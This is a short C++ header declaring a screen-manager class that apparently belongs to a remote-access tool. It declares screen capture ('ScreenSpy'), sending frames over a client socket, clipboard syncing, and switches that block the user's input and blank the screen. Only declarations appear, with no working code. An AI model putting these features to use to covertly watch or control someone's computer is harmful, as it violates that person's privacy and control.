#include "Manager.h"
#include"ScreenSpy.h"

class CScreenManager :
	public CManager
{
public:
	CScreenManager(CClientSocket *pClient);
	virtual ~CScreenManager();
public:
	bool m_bIsWorking;
	bool m_bIsBlockInput;
	bool m_bIsBlankScreen;
private:
	BYTE	m_bAlgorithm;
	bool	m_bIsCaptureLayer;
	int	m_biBitCount;
	HANDLE	m_hWorkThread, m_hBlankThread;
	CCursorInfo	m_CursorInfo;
	CScreenSpy	*m_pScreenSpy;
public:
	static DWORD WINAPI ControlThread(LPVOID lparam);
	bool IsConnect();
	bool IsMetricsChange();
	void ResetScreen(int biBitCount);
	int GetCurrentPixelBits();
	static DWORD WINAPI WorkThread(LPVOID lparam);
	void sendBITMAPINFO();
	void sendFirstScreen();
	void sendNextScreen();
	void UpdateLocalClipboard(char *buf, int len);
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	void SendLocalClipboard();
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
};
